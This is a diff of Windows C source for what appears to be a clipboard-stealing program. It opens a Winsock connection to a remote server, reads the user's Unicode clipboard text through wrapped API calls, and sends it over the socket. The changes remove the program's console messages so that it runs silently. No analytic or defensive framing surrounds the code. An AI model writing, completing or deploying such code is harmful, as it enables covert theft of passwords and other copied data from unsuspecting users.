@@ -17,8 +17,6 @@ int hostname_to_ip(const char* hostname, char* ip)
 
 	if ((he = gethostbyname(hostname)) == NULL)
 	{
-		// get the host info
-		printf("gethostbyname");
 		return 1;
 	}
 
@@ -46,24 +44,18 @@ void setup_addrinfo(struct sockaddr_in *servinfo, const char* ip, const u_short 
 	WSADATA wsa;
 	struct sockaddr_in server;
 	SOCKET sock;
-	printf("\nInitialising Winsock...");
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
 	{
-		printf("Failed. Error Code : %d", WSAGetLastError());
 		return NULL;
 	}
-
-	printf("Initialised.\n");
 
 	//Create a socket
 	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
 	{
-		printf("Could not create socket : %d", WSAGetLastError());
 		return NULL;
 	}
 #ifdef DNS_TRANSLATE
 	char ip[100];
-	printf("Socket created.\n");
 	if (hostname_to_ip(hostname, ip)) {
 		return NULL;
 	}
@@ -74,16 +66,13 @@ void setup_addrinfo(struct sockaddr_in *servinfo, const char* ip, const u_short 
 #endif // DNS_TRANSLATE
 
 	
-	
 	//Connect to remote server
 	if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0)
 	{
-		puts("connect error");
 		closesocket(sock);
 		return NULL;
 	}
 
-	puts("Connected");
 	return sock;
 
 }
@@ -99,7 +88,6 @@ int send_message(const LPWSTR content, HANDLE* socket_file_descriptor) {
 	}
 	if (send(socket_file_descriptor, content, buff_size, 0) < 0)
 	{
-		puts("Send failed");
 		closesocket((SOCKET) socket_file_descriptor);
 		return 1;
 	}
@@ -107,20 +95,23 @@ int send_message(const LPWSTR content, HANDLE* socket_file_descriptor) {
 }
 
 int send_clipboard_data(HANDLE*  socket_file_descriptor) {
-	DWORD rc = 1;
+	DWORD rc = 0;
 
-	if (!LpOpenClipboard(NULL))
+	if (!LpOpenClipboard(NULL)) {
 		goto out;
+	}
 
 	const HANDLE handle = LpGetClipboardData(CF_UNICODETEXT);
 
-	if (!handle)
+	if (!handle) {
 		goto close;
+	}
 
 	const LPCVOID data = LpGlobalLock(handle);
 
-	if (!data)
+	if (!data) {
 		goto close;
+	}
 	LPWSTR content = (LPWSTR)data;
 	DWORD buff_size = wcslen(content) * sizeof(content[0]);
 	for (size_t i = 0; i < wcslen(content); i += 1) {
@@ -131,11 +122,9 @@ int send_clipboard_data(HANDLE*  socket_file_descriptor) {
 	}
 	if (send(socket_file_descriptor, content, buff_size, 0) < 0)
 	{
-		puts("Send failed");
 		closesocket(socket_file_descriptor);
 		return 1;
 	}
-	rc = 0;
 
 
 	LpGlobalUnlock(handle);
